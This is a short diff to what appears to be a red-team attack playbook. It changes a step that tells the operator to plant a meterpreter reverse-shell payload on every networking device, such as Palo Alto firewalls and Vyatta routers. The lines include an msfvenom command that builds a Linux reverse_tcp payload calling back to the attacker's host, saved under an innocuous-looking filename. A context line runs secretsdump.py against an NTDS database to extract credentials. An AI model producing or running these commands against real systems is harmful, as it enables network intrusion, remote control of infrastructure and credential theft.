@@ -522,10 +522,10 @@ secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
 Target all Networking Devices and drop a payload that creates a meterpreter session on each of them:
 
 Make the Payload file for The Palo:
-On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called pan_sec_pol.
+On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called netflow.palo .
 
 ``` bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > pan_sec_pol
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > netflow.palo
 ```
 
 Next, make the payload file for the vyatta routers:
